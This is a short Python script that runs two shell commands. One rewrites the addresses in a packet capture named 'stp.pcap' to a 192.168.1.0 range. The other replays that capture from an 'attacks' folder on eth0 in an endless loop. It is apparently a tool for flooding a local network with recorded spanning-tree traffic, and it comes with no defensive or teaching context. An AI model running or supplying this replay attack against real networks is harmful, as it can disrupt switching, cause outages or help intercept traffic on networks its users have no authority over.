import os
import sys

os.system('tcprewrite --pnat=10.0.0.0:192.168.1.0,172.16.0.0:192.168.1.0 --infile=stp.pcap --outfile=stp.pcap')
os.system('tcpreplay --loop=0 --intf1=eth0 /root/Desktop/attacks/stp.pcap')
